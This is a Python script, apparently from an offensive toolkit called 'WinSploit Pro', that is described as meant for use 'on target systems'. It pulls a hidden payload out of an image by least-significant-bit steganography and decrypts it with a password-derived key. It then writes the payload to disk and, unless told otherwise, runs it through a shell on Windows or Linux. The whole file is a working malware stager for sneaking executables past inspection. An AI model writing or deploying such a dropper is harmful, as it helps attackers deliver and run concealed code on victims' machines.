#!/usr/bin/env python3
"""
Payload Extraction Script for WinSploit Pro
This script can be used on target systems to extract hidden payloads from steganographic images
"""

import os
import sys
import base64
import subprocess
from PIL import Image
from stegano import lsb
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key_from_password(password: str, salt: bytes) -> bytes:
    """Generate encryption key from password"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

def decrypt_payload(encrypted_data: bytes, password: str, salt: bytes) -> bytes:
    """Decrypt payload data with password"""
    key = generate_key_from_password(password, salt)
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    return decrypted_data

def extract_and_execute(image_path: str, password: str = None, execute: bool = True):
    """Extract payload from image and optionally execute it"""
    try:
        if not os.path.exists(image_path):
            print(f"Image file not found: {image_path}")
            return False
        
        # Extract hidden data
        hidden_data = lsb.reveal(image_path)
        
        if not hidden_data:
            print("No hidden data found in image")
            return False
        
        # Check for WinSploit payload marker
        if not hidden_data.startswith("WINSPLOIT_PAYLOAD:"):
            print("No WinSploit payload found in image")
            return False
        
        # Parse metadata
        parts = hidden_data.split(':', 3)
        if len(parts) < 4:
            print("Invalid payload format")
            return False
        
        payload_name = parts[1]
        payload_size = int(parts[2])
        encoded_data = parts[3]
        
        # Decode base64 data
        decoded_data = base64.b64decode(encoded_data.encode('utf-8'))
        
        # Check if data is encrypted
        if decoded_data.startswith(b'|ENCRYPTED|'):
            if not password:
                print("Payload is encrypted but no password provided")
                return False
            
            # Extract salt and encrypted data
            encrypted_part = decoded_data[12:]  # Remove |ENCRYPTED| marker
            salt = encrypted_part[:16]
            encrypted_payload = encrypted_part[16:]
            
            # Decrypt payload
            payload_data = decrypt_payload(encrypted_payload, password, salt)
            
        elif decoded_data.startswith(b'|PLAIN|'):
            payload_data = decoded_data[7:]  # Remove |PLAIN| marker
        else:
            print("Invalid payload format")
            return False
        
        # Verify payload size
        if len(payload_data) != payload_size:
            print("Payload size mismatch - data may be corrupted")
            return False
        
        # Save extracted payload
        output_path = payload_name
        with open(output_path, 'wb') as f:
            f.write(payload_data)
        
        print(f"Payload extracted: {output_path}")
        
        if execute:
            print("Executing payload...")
            if os.name == 'nt':  # Windows
                subprocess.Popen(output_path, shell=True)
            else:  # Linux/Unix
                os.chmod(output_path, 0o755)
                subprocess.Popen(f"./{output_path}", shell=True)
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 extract_payload.py <image_file> [password] [--no-execute]")
        print("Example: python3 extract_payload.py photo.png")
        print("Example: python3 extract_payload.py photo.png mypassword")
        print("Example: python3 extract_payload.py photo.png mypassword --no-execute")
        sys.exit(1)
    
    image_path = sys.argv[1]
    password = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith('--') else None
    execute = '--no-execute' not in sys.argv
    
    extract_and_execute(image_path, password, execute)

if __name__ == "__main__":
    main()
